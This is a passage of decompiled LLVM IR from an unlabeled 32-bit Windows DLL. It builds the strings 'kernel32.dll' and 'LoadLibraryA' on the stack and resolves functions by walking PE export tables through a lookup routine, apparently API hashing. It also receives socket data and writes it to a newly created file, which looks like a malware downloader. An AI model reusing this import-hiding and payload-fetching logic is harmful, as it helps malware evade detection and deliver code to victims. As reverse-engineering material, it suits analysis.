  %319 = add i32 %esp.3.reload, -104, !insn.addr !6313
  %320 = inttoptr i32 %319 to i32*, !insn.addr !6313
  store i32 ptrtoint ([3 x i8]* @global_var_10039574 to i32), i32* %320, align 4, !insn.addr !6313
  %321 = add i32 %esp.3.reload, -108, !insn.addr !6314
  %322 = inttoptr i32 %321 to i32*, !insn.addr !6314
  store i32 %318, i32* %322, align 4, !insn.addr !6314
  %323 = call i8* @StrStrIA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6315
  store i8 0, i8* %323, align 1, !insn.addr !6316
  store i32 %321, i32* %esp.6.reg2mem, !insn.addr !6316
  store i32 %318, i32* %esi.4.reg2mem, !insn.addr !6316
  br label %dec_label_pc_1000aa1a, !insn.addr !6316

dec_label_pc_1000aa1a:                            ; preds = %dec_label_pc_1000aa0c, %dec_label_pc_1000a890
  %esi.4.reload = load i32, i32* %esi.4.reg2mem
  %esp.6.reload = load i32, i32* %esp.6.reg2mem
  %324 = inttoptr i32 %arg2 to i32*, !insn.addr !6317
  store i32 3, i32* %324, align 4, !insn.addr !6317
  store i32 %esp.6.reload, i32* %esp.7.reg2mem, !insn.addr !6317
  store i32 %esi.4.reload, i32* %esi.5.reg2mem, !insn.addr !6317
  br label %dec_label_pc_1000aa26, !insn.addr !6317

dec_label_pc_1000aa26:                            ; preds = %dec_label_pc_1000aa1a, %dec_label_pc_1000a9e3, %dec_label_pc_1000a9b2, %dec_label_pc_1000a97e, %dec_label_pc_1000a94a, %dec_label_pc_1000a916, %dec_label_pc_1000a8e4, %dec_label_pc_1000a8b6, %dec_label_pc_1000a85e, %dec_label_pc_1000a82c, %dec_label_pc_1000a7f4
  %esi.5.reload = load i32, i32* %esi.5.reg2mem
  %esp.7.reload = load i32, i32* %esp.7.reg2mem
  %325 = add i32 %esp.7.reload, -4, !insn.addr !6318
  %326 = inttoptr i32 %325 to i32*, !insn.addr !6318
  store i32 %esi.5.reload, i32* %326, align 4, !insn.addr !6318
  %327 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !6319
  %328 = icmp eq i32 %327, 0, !insn.addr !6320
  store i32 %325, i32* %esp.4.reg2mem, !insn.addr !6321
  br i1 %328, label %dec_label_pc_1000a795, label %dec_label_pc_1000aa35, !insn.addr !6321

dec_label_pc_1000aa35:                            ; preds = %dec_label_pc_1000aa26
  %329 = call i32 @function_100095d0(), !insn.addr !6322
  %330 = add i32 %esp.7.reload, -8, !insn.addr !6323
  %331 = inttoptr i32 %330 to i32*, !insn.addr !6323
  store i32 ptrtoint ([8 x i8]* @global_var_1003954c to i32), i32* %331, align 4, !insn.addr !6323
  %332 = add i32 %esp.7.reload, -12, !insn.addr !6324
  %333 = inttoptr i32 %332 to i32*, !insn.addr !6324
  store i32 %329, i32* %333, align 4, !insn.addr !6324
  %334 = inttoptr i32 %329 to i8*, !insn.addr !6325
  %335 = call i8* @StrStrIA(i8* %334, i8* bitcast (i32* @1 to i8*)), !insn.addr !6325
  %336 = icmp eq i8* %335, null, !insn.addr !6326
  %337 = add i32 %329, 7
  %spec.select9 = select i1 %336, i32 %329, i32 %337
  %338 = add i32 %esp.7.reload, -16, !insn.addr !6327
  %339 = inttoptr i32 %338 to i32*, !insn.addr !6327
  store i32 ptrtoint ([9 x i8]* @global_var_10039554 to i32), i32* %339, align 4, !insn.addr !6327
  %340 = add i32 %esp.7.reload, -20, !insn.addr !6328
  %341 = inttoptr i32 %340 to i32*, !insn.addr !6328
  store i32 %spec.select9, i32* %341, align 4, !insn.addr !6328
  %342 = call i8* @StrStrIA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6329
  %343 = icmp eq i8* %342, null, !insn.addr !6330
  %344 = add i32 %spec.select9, 8
  %esi.7 = select i1 %343, i32 %spec.select9, i32 %344
  %345 = inttoptr i32 %esi.7 to i8*, !insn.addr !6331
  %346 = load i8, i8* %345, align 1, !insn.addr !6331
  %347 = icmp eq i8 %346, 47, !insn.addr !6332
  store i32 0, i32* %edx.5.reg2mem, !insn.addr !6333
  store i32 %329, i32* %edi.3.reg2mem, !insn.addr !6333
  br i1 %347, label %dec_label_pc_1000aa8e, label %dec_label_pc_1000aa72, !insn.addr !6333

dec_label_pc_1000aa72:                            ; preds = %dec_label_pc_1000aa35
  %348 = sub i32 %0, %esi.7, !insn.addr !6334
  store i8 %346, i8* %eax.1.reg2mem, !insn.addr !6334
  store i32 %esi.7, i32* %ecx.6.reg2mem, !insn.addr !6334
  store i32 0, i32* %edx.3.reg2mem, !insn.addr !6334
  br label %dec_label_pc_1000aa78, !insn.addr !6334

dec_label_pc_1000aa78:                            ; preds = %dec_label_pc_1000aa7c, %dec_label_pc_1000aa72
  %edx.3.reload = load i32, i32* %edx.3.reg2mem
  %eax.1.reload = load i8, i8* %eax.1.reg2mem
  %349 = icmp eq i8 %eax.1.reload, 0, !insn.addr !6335
  store i32 %edx.3.reload, i32* %edx.4.reg2mem, !insn.addr !6336
  br i1 %349, label %dec_label_pc_1000aa88, label %dec_label_pc_1000aa7c, !insn.addr !6336

dec_label_pc_1000aa7c:                            ; preds = %dec_label_pc_1000aa78
  %ecx.6.reload = load i32, i32* %ecx.6.reg2mem
  %350 = add i32 %348, %ecx.6.reload, !insn.addr !6337
  %351 = inttoptr i32 %350 to i8*, !insn.addr !6337
  store i8 %eax.1.reload, i8* %351, align 1, !insn.addr !6337
  %352 = add i32 %edx.3.reload, 1, !insn.addr !6338
  %353 = add i32 %ecx.6.reload, 1, !insn.addr !6339
  %354 = inttoptr i32 %353 to i8*, !insn.addr !6339
  %355 = load i8, i8* %354, align 1, !insn.addr !6339
  %356 = icmp eq i8 %355, 47, !insn.addr !6340
  %357 = icmp eq i1 %356, false, !insn.addr !6341
  store i8 %355, i8* %eax.1.reg2mem, !insn.addr !6341
  store i32 %353, i32* %ecx.6.reg2mem, !insn.addr !6341
  store i32 %352, i32* %edx.3.reg2mem, !insn.addr !6341
  store i32 %352, i32* %edx.4.reg2mem, !insn.addr !6341
  br i1 %357, label %dec_label_pc_1000aa78, label %dec_label_pc_1000aa88, !insn.addr !6341

dec_label_pc_1000aa88:                            ; preds = %dec_label_pc_1000aa7c, %dec_label_pc_1000aa78
  %edx.4.reload = load i32, i32* %edx.4.reg2mem
  %sext = mul i32 %329, 16777216
  %358 = sdiv i32 %sext, 16777216, !insn.addr !6342
  store i32 %edx.4.reload, i32* %edx.5.reg2mem, !insn.addr !6342
  store i32 %358, i32* %edi.3.reg2mem, !insn.addr !6342
  br label %dec_label_pc_1000aa8e, !insn.addr !6342

dec_label_pc_1000aa8e:                            ; preds = %dec_label_pc_1000aa88, %dec_label_pc_1000aa35
  %edi.3.reload = load i32, i32* %edi.3.reg2mem
  %edx.5.reload = load i32, i32* %edx.5.reg2mem
  %359 = add i32 %edx.5.reload, %0, !insn.addr !6343
  %360 = inttoptr i32 %359 to i8*, !insn.addr !6343
  store i8 0, i8* %360, align 1, !insn.addr !6343
  %361 = add i32 %edx.5.reload, %esi.7, !insn.addr !6344
  %362 = sub i32 %arg1, %361, !insn.addr !6345
  %363 = inttoptr i32 %361 to i8*, !insn.addr !6346
  %364 = load i8, i8* %363, align 1, !insn.addr !6346
  store i8 %364, i8* %eax.4.reg2mem, !insn.addr !6346
  store i32 0, i32* %ecx.7.reg2mem, !insn.addr !6346
  store i32 %361, i32* %esi.8.reg2mem, !insn.addr !6346
  br label %dec_label_pc_1000aaa2, !insn.addr !6346

dec_label_pc_1000aaa2:                            ; preds = %dec_label_pc_1000aaa2, %dec_label_pc_1000aa8e
  %esi.8.reload = load i32, i32* %esi.8.reg2mem
  %ecx.7.reload = load i32, i32* %ecx.7.reg2mem
  %eax.4.reload = load i8, i8* %eax.4.reg2mem
  %365 = add i32 %362, %esi.8.reload, !insn.addr !6347
  %366 = inttoptr i32 %365 to i8*, !insn.addr !6347
  store i8 %eax.4.reload, i8* %366, align 1, !insn.addr !6347
  %367 = add i32 %esi.8.reload, 1, !insn.addr !6348
  %368 = inttoptr i32 %367 to i8*, !insn.addr !6349
  %369 = load i8, i8* %368, align 1, !insn.addr !6349
  %370 = add i32 %ecx.7.reload, 1, !insn.addr !6350
  %371 = icmp eq i8 %369, 0, !insn.addr !6351
  %372 = icmp eq i1 %371, false, !insn.addr !6352
  store i8 %369, i8* %eax.4.reg2mem, !insn.addr !6352
  store i32 %370, i32* %ecx.7.reg2mem, !insn.addr !6352
  store i32 %367, i32* %esi.8.reg2mem, !insn.addr !6352
  br i1 %372, label %dec_label_pc_1000aaa2, label %dec_label_pc_1000aab1, !insn.addr !6352

dec_label_pc_1000aab1:                            ; preds = %dec_label_pc_1000aaa2
  %373 = add i32 %esp.7.reload, -24, !insn.addr !6353
  %374 = inttoptr i32 %373 to i32*, !insn.addr !6353
  store i32 %edi.3.reload, i32* %374, align 4, !insn.addr !6353
  %375 = add i32 %370, %arg1, !insn.addr !6354
  %376 = inttoptr i32 %375 to i8*, !insn.addr !6354
  store i8 %369, i8* %376, align 1, !insn.addr !6354
  %377 = call i32* @LocalFree(i32* nonnull @1), !insn.addr !6355
  %378 = add i32 %esp.7.reload, -28, !insn.addr !6356
  %379 = inttoptr i32 %378 to i32*, !insn.addr !6356
  store i32 %115, i32* %379, align 4, !insn.addr !6356
  %380 = call i32* @LocalFree(i32* nonnull @1), !insn.addr !6357
  store i32 %378, i32* %esp.5.reg2mem, !insn.addr !6358
  br label %dec_label_pc_1000a79c, !insn.addr !6358

dec_label_pc_1000aacb:                            ; preds = %dec_label_pc_1000a9f4, %dec_label_pc_1000a7be, %dec_label_pc_1000a778
  %esp.8.reload = load i32, i32* %esp.8.reg2mem
  %381 = add i32 %esp.8.reload, -4, !insn.addr !6359
  %382 = inttoptr i32 %381 to i32*, !insn.addr !6359
  store i32 %115, i32* %382, align 4, !insn.addr !6359
  %383 = call i32* @LocalFree(i32* nonnull @1), !insn.addr !6360
  %384 = load i32, i32* @global_var_100409e0, align 4, !insn.addr !6361
  %385 = add i32 %esp.8.reload, -8, !insn.addr !6361
  %386 = inttoptr i32 %385 to i32*, !insn.addr !6361
  store i32 %384, i32* %386, align 4, !insn.addr !6361
  %387 = call i1 @ReleaseMutex(i32* nonnull @1), !insn.addr !6362
  %388 = call i32 @"@__security_check_cookie@4"(), !insn.addr !6363
  ret i32 %388, !insn.addr !6364

dec_label_pc_1000aaf1:                            ; preds = %dec_label_pc_1000a669, %dec_label_pc_1000a5e4
  %edi.4.reload = load i32, i32* %edi.4.reg2mem
  %esi.9.reload = load i32, i32* %esi.9.reg2mem
  %esp.9.reload = load i32, i32* %esp.9.reg2mem
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %edx.6.reload = load i32, i32* %edx.6.reg2mem
  %ecx.8.reload = load i32, i32* %ecx.8.reg2mem
  %389 = call i32 @___report_rangecheckfailure(), !insn.addr !6365
  %390 = call i32 @__asm_int3(), !insn.addr !6366
  %391 = call i32 @__asm_int3(), !insn.addr !6367
  %392 = call i32 @__asm_int3(), !insn.addr !6368
  %393 = call i32 @__asm_int3(), !insn.addr !6369
  %394 = call i32 @__asm_int3(), !insn.addr !6370
  %395 = call i32 @__asm_int3(), !insn.addr !6371
  %396 = call i32 @__asm_int3(), !insn.addr !6372
  %397 = call i32 @__asm_int3(), !insn.addr !6373
  %398 = call i32 @__asm_int3(), !insn.addr !6374
  %399 = call i32 @__asm_int3(), !insn.addr !6375
  %400 = add i32 %esp.9.reload, -4, !insn.addr !6376
  %401 = inttoptr i32 %400 to i32*, !insn.addr !6376
  store i32 %7, i32* %401, align 4, !insn.addr !6376
  %402 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !6377
  %403 = xor i32 %402, %400, !insn.addr !6378
  %404 = add i32 %esp.9.reload, -12, !insn.addr !6379
  %405 = inttoptr i32 %404 to i32*, !insn.addr !6379
  store i32 %403, i32* %405, align 4, !insn.addr !6379
  %406 = add i32 %esp.9.reload, 8, !insn.addr !6380
  %407 = inttoptr i32 %406 to i32*, !insn.addr !6380
  %408 = load i32, i32* %407, align 4, !insn.addr !6380
  %409 = add i32 %esp.9.reload, -2432, !insn.addr !6381
  %410 = inttoptr i32 %409 to i32*, !insn.addr !6381
  store i32 %ebx.1.reload, i32* %410, align 4, !insn.addr !6381
  %411 = add i32 %esp.9.reload, -2436, !insn.addr !6382
  %412 = inttoptr i32 %411 to i32*, !insn.addr !6382
  store i32 %esi.9.reload, i32* %412, align 4, !insn.addr !6382
  %413 = add i32 %esp.9.reload, -2440, !insn.addr !6383
  %414 = inttoptr i32 %413 to i32*, !insn.addr !6383
  store i32 %edi.4.reload, i32* %414, align 4, !insn.addr !6383
  %415 = add i32 %esp.9.reload, -2444, !insn.addr !6384
  %416 = inttoptr i32 %415 to i32*, !insn.addr !6384
  store i32 99, i32* %416, align 4, !insn.addr !6384
  %417 = add i32 %esp.9.reload, -2404, !insn.addr !6385
  %418 = inttoptr i32 %417 to i32*, !insn.addr !6385
  store i32 %408, i32* %418, align 4, !insn.addr !6385
  %419 = add i32 %esp.9.reload, -127, !insn.addr !6386
  %420 = add i32 %esp.9.reload, -2396, !insn.addr !6387
  %421 = inttoptr i32 %420 to i32*, !insn.addr !6387
  store i32 %edx.6.reload, i32* %421, align 4, !insn.addr !6387
  %422 = add i32 %esp.9.reload, -2448, !insn.addr !6388
  %423 = inttoptr i32 %422 to i32*, !insn.addr !6388
  store i32 0, i32* %423, align 4, !insn.addr !6388
  %424 = add i32 %esp.9.reload, -2452, !insn.addr !6389
  %425 = inttoptr i32 %424 to i32*, !insn.addr !6389
  store i32 %419, i32* %425, align 4, !insn.addr !6389
  %426 = call i32* @_memset(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6390
  %427 = add i32 %esp.9.reload, -128, !insn.addr !6391
  %428 = inttoptr i32 %427 to i32*, !insn.addr !6391
  store i32 1852990827, i32* %428, align 4, !insn.addr !6391
  %429 = add i32 %esp.9.reload, -124, !insn.addr !6392
  %430 = inttoptr i32 %429 to i32*, !insn.addr !6392
  store i32 842230885, i32* %430, align 4, !insn.addr !6392
  %431 = add i32 %esp.9.reload, -120, !insn.addr !6393
  %432 = inttoptr i32 %431 to i32*, !insn.addr !6393
  store i32 1819042862, i32* %432, align 4, !insn.addr !6393
  %433 = add i32 %esp.9.reload, -116, !insn.addr !6394
  %434 = inttoptr i32 %433 to i8*, !insn.addr !6394
  store i8 0, i8* %434, align 1, !insn.addr !6394
  store i32 %427, i32* %416, align 4, !insn.addr !6395
  %435 = call i32* @GetModuleHandleA(i8* bitcast (i32* @1 to i8*)), !insn.addr !6396
  %436 = ptrtoint i32* %435 to i32, !insn.addr !6396
  %437 = add i32 %esp.9.reload, -232, !insn.addr !6397
  %438 = inttoptr i32 %437 to i32*, !insn.addr !6397
  store i32 1684107084, i32* %438, align 4, !insn.addr !6397
  %439 = add i32 %esp.9.reload, -228, !insn.addr !6398
  %440 = inttoptr i32 %439 to i32*, !insn.addr !6398
  store i32 1919052108, i32* %440, align 4, !insn.addr !6398
  %441 = add i32 %esp.9.reload, -224, !insn.addr !6399
  %442 = inttoptr i32 %441 to i32*, !insn.addr !6399
  store i32 1098478177, i32* %442, align 4, !insn.addr !6399
  %443 = add i32 %esp.9.reload, -220, !insn.addr !6400
  %444 = inttoptr i32 %443 to i8*, !insn.addr !6400
  store i8 0, i8* %444, align 1, !insn.addr !6400
  %445 = add i32 %436, 60, !insn.addr !6401
  %446 = inttoptr i32 %445 to i32*, !insn.addr !6401
  %447 = load i32, i32* %446, align 4, !insn.addr !6401
  %448 = add i32 %436, 120, !insn.addr !6402
  %449 = add i32 %448, %447, !insn.addr !6402
  %450 = inttoptr i32 %449 to i32*, !insn.addr !6402
  %451 = load i32, i32* %450, align 4, !insn.addr !6402
  %452 = add i32 %451, %436, !insn.addr !6403
  store i32 %437, i32* %423, align 4, !insn.addr !6404
  store i32 %436, i32* %425, align 4, !insn.addr !6405
  %453 = call i32 @function_10009e60(i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !6406
  %454 = add i32 %452, 36, !insn.addr !6407
  %455 = inttoptr i32 %454 to i32*, !insn.addr !6407
  %456 = load i32, i32* %455, align 4, !insn.addr !6407
  %457 = mul i32 %453, 2, !insn.addr !6408
  %458 = add i32 %457, %436, !insn.addr !6408
  %459 = add i32 %458, %456, !insn.addr !6409
  %460 = inttoptr i32 %459 to i16*, !insn.addr !6409
  %461 = load i16, i16* %460, align 2, !insn.addr !6409
  %462 = zext i16 %461 to i32, !insn.addr !6409
  %463 = add i32 %452, 28, !insn.addr !6410
  %464 = inttoptr i32 %463 to i32*, !insn.addr !6410
  %465 = load i32, i32* %464, align 4, !insn.addr !6410
  %466 = mul i32 %462, 4, !insn.addr !6411
  %467 = add i32 %465, %436, !insn.addr !6411
  %468 = add i32 %467, %466, !insn.addr !6412
  %469 = inttoptr i32 %468 to i32*, !insn.addr !6412
  %470 = load i32, i32* %469, align 4, !insn.addr !6412
  %471 = add i32 %470, %436, !insn.addr !6413
  store i32 %427, i32* %423, align 4, !insn.addr !6414
  store i32 %471, i32* @global_var_1004094c, align 4, !insn.addr !6415
  store i32 ptrtoint ([10 x i8]* @global_var_10039590 to i32), i32* %425, align 4, !insn.addr !6416
  %472 = add i32 %esp.9.reload, -2456, !insn.addr !6417
  %473 = inttoptr i32 %472 to i32*, !insn.addr !6417
  store i32 %471, i32* %473, align 4, !insn.addr !6417
  %474 = add i32 %esp.9.reload, -2400, !insn.addr !6418
  %475 = inttoptr i32 %474 to i32*, !insn.addr !6418
  store i32 %471, i32* %475, align 4, !insn.addr !6418
  %476 = add i32 %471, 60, !insn.addr !6419
  %477 = inttoptr i32 %476 to i32*, !insn.addr !6419
  %478 = load i32, i32* %477, align 4, !insn.addr !6419
  %479 = add i32 %471, 120, !insn.addr !6420
  %480 = add i32 %479, %478, !insn.addr !6420
  %481 = inttoptr i32 %480 to i32*, !insn.addr !6420
  %482 = load i32, i32* %481, align 4, !insn.addr !6420
  %483 = add i32 %482, %471, !insn.addr !6421
  %484 = call i32 @function_10009e60(i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !6422
  %485 = add i32 %483, 36, !insn.addr !6423
  %486 = inttoptr i32 %485 to i32*, !insn.addr !6423
  %487 = load i32, i32* %486, align 4, !insn.addr !6423
  %488 = mul i32 %484, 2, !insn.addr !6424
  %489 = add i32 %488, %471, !insn.addr !6424
  %490 = add i32 %489, %487, !insn.addr !6425
  %491 = inttoptr i32 %490 to i16*, !insn.addr !6425
  %492 = load i16, i16* %491, align 2, !insn.addr !6425
  %493 = zext i16 %492 to i32, !insn.addr !6425
  %494 = add i32 %483, 28, !insn.addr !6426
  %495 = inttoptr i32 %494 to i32*, !insn.addr !6426
  %496 = load i32, i32* %495, align 4, !insn.addr !6426
  %497 = mul i32 %493, 4, !insn.addr !6427
  %498 = add i32 %496, %471, !insn.addr !6427
  %499 = add i32 %498, %497, !insn.addr !6428
  %500 = inttoptr i32 %499 to i32*, !insn.addr !6428
  %501 = load i32, i32* %500, align 4, !insn.addr !6428
  %502 = add i32 %501, %471, !insn.addr !6429
  %503 = add i32 %esp.9.reload, 4, !insn.addr !6430
  %504 = inttoptr i32 %503 to i32*, !insn.addr !6430
  %505 = load i32, i32* %504, align 4, !insn.addr !6430
  %506 = icmp eq i32 %505, 0, !insn.addr !6430
  %507 = add i32 %esp.9.reload, -2408, !insn.addr !6431
  %508 = inttoptr i32 %507 to i32*, !insn.addr !6431
  store i32 %502, i32* %508, align 4, !insn.addr !6431
  %509 = icmp eq i1 %506, false, !insn.addr !6432
  br i1 %509, label %dec_label_pc_1000ad5c, label %dec_label_pc_1000ac0f, !insn.addr !6432

dec_label_pc_1000ac0f:                            ; preds = %dec_label_pc_1000aaf1
  %510 = call i32 @function_1000ce70(), !insn.addr !6433
  %511 = icmp eq i32 %510, -1, !insn.addr !6434
  br i1 %511, label %dec_label_pc_1000b09b, label %dec_label_pc_1000ac30.preheader, !insn.addr !6435

dec_label_pc_1000ac30.preheader:                  ; preds = %dec_label_pc_1000ac0f
  %512 = add i32 %esp.9.reload, -2384
  store i32 0, i32* %eax.5.reg2mem
  br label %dec_label_pc_1000ac3b

dec_label_pc_1000ac3b:                            ; preds = %dec_label_pc_1000ac3b, %dec_label_pc_1000ac30.preheader
  %eax.5.reload = load i32, i32* %eax.5.reg2mem
  %513 = add i32 %eax.5.reload, %512, !insn.addr !6436
  %514 = inttoptr i32 %513 to i8*, !insn.addr !6436
  store i8 0, i8* %514, align 1, !insn.addr !6436
  %515 = add nuw nsw i32 %eax.5.reload, 1, !insn.addr !6437
  %exitcond = icmp eq i32 %515, 1000
  store i32 %515, i32* %eax.5.reg2mem, !insn.addr !6438
  br i1 %exitcond, label %dec_label_pc_1000ac4b, label %dec_label_pc_1000ac3b, !insn.addr !6438

dec_label_pc_1000ac4b:                            ; preds = %dec_label_pc_1000ac3b
  %516 = load i32, i32* %475, align 4, !insn.addr !6439
  store i32 ptrtoint ([12 x i8]* @global_var_1003959c to i32), i32* %425, align 4, !insn.addr !6440
  store i32 %516, i32* %473, align 4, !insn.addr !6441
  %517 = add i32 %516, 60, !insn.addr !6442
  %518 = inttoptr i32 %517 to i32*, !insn.addr !6442
  %519 = load i32, i32* %518, align 4, !insn.addr !6442
  %520 = add i32 %516, 120, !insn.addr !6443
  %521 = add i32 %520, %519, !insn.addr !6443
  %522 = inttoptr i32 %521 to i32*, !insn.addr !6443
  %523 = load i32, i32* %522, align 4, !insn.addr !6443
  %524 = add i32 %523, %516, !insn.addr !6444
  %525 = call i32 @function_10009e60(i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !6445
  %526 = add i32 %524, 36, !insn.addr !6446
  %527 = inttoptr i32 %526 to i32*, !insn.addr !6446
  %528 = load i32, i32* %527, align 4, !insn.addr !6446
  store i32 0, i32* %425, align 4, !insn.addr !6447
  %529 = mul i32 %525, 2, !insn.addr !6448
  %530 = add i32 %529, %516, !insn.addr !6448
  %531 = add i32 %530, %528, !insn.addr !6449
  %532 = inttoptr i32 %531 to i16*, !insn.addr !6449
  %533 = load i16, i16* %532, align 2, !insn.addr !6449
  %534 = zext i16 %533 to i32, !insn.addr !6449
  %535 = add i32 %524, 28, !insn.addr !6450
  %536 = inttoptr i32 %535 to i32*, !insn.addr !6450
  %537 = load i32, i32* %536, align 4, !insn.addr !6450
  store i32 128, i32* %473, align 4, !insn.addr !6451
  %538 = add i32 %esp.9.reload, -2460, !insn.addr !6452
  %539 = inttoptr i32 %538 to i32*, !insn.addr !6452
  store i32 2, i32* %539, align 4, !insn.addr !6452
  %540 = add i32 %esp.9.reload, -2464, !insn.addr !6453
  %541 = inttoptr i32 %540 to i32*, !insn.addr !6453
  store i32 0, i32* %541, align 4, !insn.addr !6453
  %542 = add i32 %esp.9.reload, -2468, !insn.addr !6454
  %543 = inttoptr i32 %542 to i32*, !insn.addr !6454
  store i32 0, i32* %543, align 4, !insn.addr !6454
  %544 = mul i32 %534, 4, !insn.addr !6455
  %545 = add i32 %537, %516, !insn.addr !6455
  %546 = add i32 %545, %544, !insn.addr !6456
  %547 = inttoptr i32 %546 to i32*, !insn.addr !6456
  %548 = load i32, i32* %547, align 4, !insn.addr !6456
  %549 = add i32 %esp.9.reload, -2472, !insn.addr !6457
  %550 = inttoptr i32 %549 to i32*, !insn.addr !6457
  store i32 1073741824, i32* %550, align 4, !insn.addr !6457
  %551 = load i32, i32* %418, align 4, !insn.addr !6458
  %552 = add i32 %esp.9.reload, -2476, !insn.addr !6458
  %553 = inttoptr i32 %552 to i32*, !insn.addr !6458
  store i32 %551, i32* %553, align 4, !insn.addr !6458
  %554 = add i32 %548, %516, !insn.addr !6459
  %555 = add i32 %esp.9.reload, -2480, !insn.addr !6460
  %556 = inttoptr i32 %555 to i32*, !insn.addr !6460
  store i32 0, i32* %556, align 4, !insn.addr !6460
  %557 = add i32 %esp.9.reload, -2484, !insn.addr !6461
  %558 = inttoptr i32 %557 to i32*, !insn.addr !6461
  store i32 2048, i32* %558, align 4, !insn.addr !6461
  %559 = add i32 %esp.9.reload, -2488, !insn.addr !6462
  %560 = inttoptr i32 %559 to i32*, !insn.addr !6462
  store i32 %512, i32* %560, align 4, !insn.addr !6462
  %561 = add i32 %esp.9.reload, -2492, !insn.addr !6463
  %562 = inttoptr i32 %561 to i32*, !insn.addr !6463
  store i32 %510, i32* %562, align 4, !insn.addr !6463
  store i32 %554, i32* %421, align 4, !insn.addr !6464
  %563 = call i32 @recv(i32 ptrtoint (i32* @1 to i32), i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6465
  %564 = icmp eq i32 %563, 0, !insn.addr !6466
  %565 = icmp slt i32 %563, 0, !insn.addr !6466
  %566 = icmp eq i1 %565, false, !insn.addr !6467
  %567 = icmp eq i1 %564, false, !insn.addr !6467
  %568 = icmp eq i1 %566, %567, !insn.addr !6467
  br i1 %568, label %dec_label_pc_1000acdc, label %dec_label_pc_1000acc2, !insn.addr !6467

dec_label_pc_1000acc2:                            ; preds = %dec_label_pc_1000ac4b
  %569 = add i32 %esp.9.reload, -2496, !insn.addr !6468
  %570 = inttoptr i32 %569 to i32*, !insn.addr !6468
  store i32 %510, i32* %570, align 4, !insn.addr !6468
  %571 = call i32 @closesocket(i32 ptrtoint (i32* @1 to i32)), !insn.addr !6469
  br label %dec_label_pc_1000acc9, !insn.addr !6469

dec_label_pc_1000acc9:                            ; preds = %dec_label_pc_1000af9d, %dec_label_pc_1000acc2
  %572 = call i32 @"@__security_check_cookie@4"(), !insn.addr !6470
  ret i32 %572, !insn.addr !6471

dec_label_pc_1000acdc:                            ; preds = %dec_label_pc_1000ac4b
  %573 = add i32 %esp.9.reload, -2372, !insn.addr !6472
  %574 = inttoptr i32 %573 to i8*, !insn.addr !6472
  %575 = load i8, i8* %574, align 1, !insn.addr !6472
  %576 = sext i8 %575 to i32, !insn.addr !6472
  %577 = add i32 %esp.9.reload, -2412, !insn.addr !6473
  %578 = add i32 %esp.9.reload, -2496, !insn.addr !6474
  %579 = inttoptr i32 %578 to i32*, !insn.addr !6474
  store i32 0, i32* %579, align 4, !insn.addr !6474
  %580 = add i32 %esp.9.reload, -2500, !insn.addr !6475
  %581 = inttoptr i32 %580 to i32*, !insn.addr !6475
  store i32 %577, i32* %581, align 4, !insn.addr !6475
  %582 = sub i32 %563, %576, !insn.addr !6476
  %583 = add i32 %esp.9.reload, -2504, !insn.addr !6477
  %584 = inttoptr i32 %583 to i32*, !insn.addr !6477
  store i32 %582, i32* %584, align 4, !insn.addr !6477
  %585 = add i32 %512, %576, !insn.addr !6478
  %586 = add i32 %esp.9.reload, -2508, !insn.addr !6479
  %587 = inttoptr i32 %586 to i32*, !insn.addr !6479
  store i32 %585, i32* %587, align 4, !insn.addr !6479
  %588 = add i32 %esp.9.reload, -2512, !insn.addr !6480
  %589 = inttoptr i32 %588 to i32*, !insn.addr !6480
  store i32 %554, i32* %589, align 4, !insn.addr !6480
  %590 = icmp slt i32 %582, 1
  store i32 %588, i32* %esp.10.reg2mem, !insn.addr !6481
  store i32 %588, i32* %esp.11.reg2mem, !insn.addr !6481
  br i1 %590, label %dec_label_pc_1000ad44, label %dec_label_pc_1000ad10, !insn.addr !6481

dec_label_pc_1000ad10:                            ; preds = %dec_label_pc_1000acdc, %dec_label_pc_1000ad10
  %esp.10.reload = load i32, i32* %esp.10.reg2mem
  %591 = add i32 %esp.10.reload, -4, !insn.addr !6482
  %592 = inttoptr i32 %591 to i32*, !insn.addr !6482
  store i32 0, i32* %592, align 4, !insn.addr !6482
  %593 = add i32 %esp.10.reload, -8, !insn.addr !6483
  %594 = inttoptr i32 %593 to i32*, !insn.addr !6483
  store i32 2048, i32* %594, align 4, !insn.addr !6483
  %595 = add i32 %esp.10.reload, -12, !insn.addr !6484
  %596 = inttoptr i32 %595 to i32*, !insn.addr !6484
  store i32 %512, i32* %596, align 4, !insn.addr !6484
  %597 = add i32 %esp.10.reload, -16, !insn.addr !6485
  %598 = inttoptr i32 %597 to i32*, !insn.addr !6485
  store i32 %510, i32* %598, align 4, !insn.addr !6485
  %599 = call i32 @recv(i32 ptrtoint (i32* @1 to i32), i8* bitcast (i32* @1 to i8*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6486
  %600 = add i32 %esp.10.reload, -20, !insn.addr !6487
  %601 = inttoptr i32 %600 to i32*, !insn.addr !6487
  store i32 0, i32* %601, align 4, !insn.addr !6487
  %602 = add i32 %esp.10.reload, -24, !insn.addr !6488
  %603 = inttoptr i32 %602 to i32*, !insn.addr !6488
  store i32 %577, i32* %603, align 4, !insn.addr !6488
  %604 = add i32 %esp.10.reload, -28, !insn.addr !6489
  %605 = inttoptr i32 %604 to i32*, !insn.addr !6489
  store i32 %599, i32* %605, align 4, !insn.addr !6489
  %606 = add i32 %esp.10.reload, -32, !insn.addr !6490
  %607 = inttoptr i32 %606 to i32*, !insn.addr !6490
  store i32 %512, i32* %607, align 4, !insn.addr !6490
  %608 = load i32, i32* %421, align 4, !insn.addr !6491
  %609 = add i32 %esp.10.reload, -36, !insn.addr !6491
  %610 = inttoptr i32 %609 to i32*, !insn.addr !6491
  store i32 %608, i32* %610, align 4, !insn.addr !6491
  %611 = icmp eq i32 %599, 0, !insn.addr !6492
  %612 = icmp slt i32 %599, 0, !insn.addr !6492
  %613 = icmp eq i1 %612, false, !insn.addr !6493
  %614 = icmp eq i1 %611, false, !insn.addr !6493
